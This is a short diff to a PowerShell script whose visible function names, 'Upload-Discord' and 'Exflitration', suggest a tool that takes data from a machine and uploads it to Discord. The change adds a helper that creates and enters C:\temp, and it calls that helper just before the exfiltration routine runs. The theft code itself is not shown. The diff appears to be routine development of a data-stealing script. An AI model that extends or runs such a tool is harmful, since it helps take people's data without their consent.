@@ -1,3 +1,20 @@
+function TempDir {
+# Vérifier si le dossier C:\temp existe
+if (Test-Path -Path "C:\temp" -PathType Container) {
+    # Le dossier existe
+
+    # Vérifier si le dossier actuel est C:\temp
+    if (-not (Get-Location).Path -eq "C:\temp") {
+        # Si ce n'est pas le cas, changer de répertoire
+        Set-Location -Path "C:\temp"
+    }
+} else {
+    # Le dossier n'existe pas, le créer et changer de répertoire
+    New-Item -Path "C:\" -Name "temp" -ItemType Directory
+    Set-Location -Path "C:\temp"
+}
+}
+
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -112,5 +129,6 @@ function Exflitration {
         exit
     }
 
+TempDir
 #Call Exflitration
 Exflitration
